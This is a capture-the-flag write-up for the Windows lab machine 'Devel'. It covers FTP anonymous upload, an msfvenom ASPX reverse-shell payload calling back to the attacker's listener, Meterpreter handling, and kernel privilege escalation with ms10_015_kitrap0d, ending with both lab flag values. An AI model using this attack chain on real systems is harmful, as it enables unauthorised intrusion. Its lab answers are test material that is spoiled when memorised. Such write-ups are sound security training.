## Devel

### Lab Details 

- Difficulty: Easy
- Type: Windows

#### Tasks
Q1: What is the name of the service is running on TCP port 21 on the target machine?
- run `nmap -sT -T4 -vv -A -p- -oA Devel 10.10.10.5`
- after running nmap we see that FTP is running at port 21
```
21/tcp open  ftp     syn-ack Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
```

Q2: Which basic FTP command can be used to upload a single file onto the server?
- `mput` allows file upload


Q3: Are files put into the FTP root available via the webserver?
- Yes, all files upload in FTP can be access in the root directory via `http://10.10.10.5/<your_file>`

Q4: What file extension is executed as a script on this webserver? 
- run ffuf to enum the web app
- `ffuf -u http://10.10.10.5/FUZZ -w /usr/share/wordlists/dirb/common.txt`
- we can see the web app is using aspnet, which aspx (active server pages)
```
<snip>
[Status: 301, Size: 155, Words: 9, Lines: 2, Duration: 316ms]
    * FUZZ: aspnet_client
<snip>
```

Q5: Which metasploit reconnaissance module can be used to list possible privilege escalation paths on a compromised system?
- can search it in msfconsole
- `msf6 > search type:post platform:windows path:multi/recon` -> post/multi/recon/local_exploit_suggester  

Q6: Get user.txt and root.txt
- Note: network can be very unstable, as i have attempted numerous times with and without msfconsole before working
- getting foothold
 - knowing we can access files that we upload via the root directory, we can upload a webshell to gain the inital foothold
 - generate a webshell using msfvenom
```
$: msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.27 LPORT=9001 -f aspx > shell.aspx
```
-  evoke the shell by visiting the file
```
http://10.10.10.5/shell.aspx -> on a browser or using curl
```
- catch the shell using msfconsole
```
# catch the shell using msfconsole
# need to set payload for the module
msf6 > set payload windows/meterpreter_reverse_tcp
payload => windows/meterpreter_reverse_tcp


msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter_reverse_tcp):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   EXITFUNC    process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   EXTENSIONS                   no        Comma-separate list of extensions to load
   EXTINIT                      no        Initialization strings for extensions
   LHOST       10.10.14.27      yes       The listen address (an interface may be specified)
   LPORT       9005             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.27:9005 
[*] Meterpreter session 1 opened (10.10.14.27:9005 -> 10.10.10.5:49181) at 2025-05-28 21:17:11 +1000
```
-  initial foothold and privilege escalate
```
# Priv Esc
# run exploit suggester
eterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[-] Failed to load extension: No response was received to the core_loadlib request.
[-] Failed to load extension: No response was received to the core_enumextcmd request.
[*] 10.10.10.5 - 184 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41
[*] 10.10.10.5 - Valid modules for session 5:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.                                                                            
 2   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.                                                                            
 3   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.                                                                                           
 4   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.                                                                                           
 5   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.                                                                                           
 6   exploit/windows/local/ms15_004_tswbproxy                       Yes                      The service is running, but could not be validated.                                                                            
 7   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.                                                                                           
 8   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.                                                                            
 9   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.                                                                            
 10  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.                                                                                           
 11  exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.                                                                                           
 12  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.

# background session
meterpreter > 
Background session 4? [y/N]  

# use ms10_015_kitrap0d
msf6 exploit(multi/handler) > use exploit/windows/local/ms10_015_kitrap0d
[*] Using configured payload windows/meterpreter_reverse_tcp
msf6 exploit(windows/local/ms10_015_kitrap0d) > set session 4
session => 4
msf6 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.14.27:9005 
[*] Reflectively injecting payload and triggering the bug...
[*] Launching netsh to host the DLL...
[+] Process 2056 launched.
[*] Reflectively injecting the DLL into 2056...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 5 opened (10.10.14.27:9005 -> 10.10.10.5:49201) at 2025-05-28 22:09:53 +1000
# create shell
meterpreter > shell
Process 1940 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>dir C:\Users\Administrator\Desktop
dir C:\Users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of C:\Users\Administrator\Desktop

14/01/2021  12:42 ��    <DIR>          .
14/01/2021  12:42 ��    <DIR>          ..
28/05/2025  01:07 ��                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   4.687.589.376 bytes free
# root.txt
c:\windows\system32\inetsrv>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
1846c702219f631ba8d19363af324ca3

# user.txt
c:\windows\system32\inetsrv>type C:\Users\babis\Desktop\user.txt
type C:\Users\babis\Desktop\user.txt
2cbe6032e3a7f50d95ef0cf8f0ca713c
```

### Resources
- precompiled exploit - https://github.com/abatchy17/WindowsExploits/tree/master
- exploit 40564 can be used on target - https://www.exploit-db.com/exploits/40564
- msfvenom reverse shells - https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
- apsx web shell - https://github.com/SecWiki/WebShell-2/blob/master/Aspx/Antak%20Webshell.aspx
- winpeas.ps1 - https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASps1/winPEAS.ps1

### Lesson Learned
- check if upload is allowed in FTP
- try different exploit for kernel exploit
- be patient with remote shells, sometimes network can be very unstable
